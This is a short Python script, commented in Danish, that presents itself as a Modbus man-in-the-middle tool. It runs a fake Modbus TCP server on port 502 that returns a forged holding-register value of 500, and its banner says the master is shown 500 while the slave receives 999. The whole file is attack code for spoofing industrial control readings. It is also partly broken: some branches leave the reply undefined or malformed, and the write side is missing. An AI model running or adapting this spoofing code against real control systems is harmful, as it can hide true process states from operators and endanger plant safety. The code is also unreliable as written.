#!/usr/bin/env python3
"""
ULTIMATE Modbus MITM - PyModbus 3.6.4 + Bridge
"""
import sys
import time
import threading
from scapy.all import *

# FALLBACK: Brug sockets hvis pymodbus fejler
print("🚀 SIMPLE Modbus MITM (Socket fallback)")
print("Master ser 500 | Slave får 999")
print("Lytter på port 502...")

def handle_client(client_socket):
    data = client_socket.recv(1024)
    if len(data) < 8:
        return
    
    # Parse Modbus TCP header (simpel)
    tid = data[0:2]
    pid = data[2:4]
    length = data[4:6]
    unit_id = data[6]
    func_code = data[7]
    
    print(f"📥 RX: TID={tid.hex()} FUNC={func_code} UNIT={unit_id}")
    
    # Fake response for read HR[2] = 500
    if func_code == 0x03:  # Read Holding Registers
        addr = int.from_bytes(data[8:10], 'big')
        count = int.from_bytes(data[10:12], 'big')
        print(f"   Read HR[{addr}..{addr+count}]")
        
        if addr <= 2 < addr + count:
            # Fake 500 på register 2
            value = 500
            response = tid + pid + b'\x00\x05' + bytes([unit_id, 0x03, 0x02]) + (500).to_bytes(2, 'big')
        else:
            response = tid + pid + b'\x00\x03' + bytes([unit_id, 0x03])
    
    client_socket.send(response)
    client_socket.close()

def modbus_server(port=502):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(5)
    print(f"🌐 Fake Modbus TCP server on :{port}")
    
    while True:
        client, addr = s.accept()
        print(f"🔗 Connection from {addr}")
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()

if __name__ == "__main__":
    import socket
    modbus_server()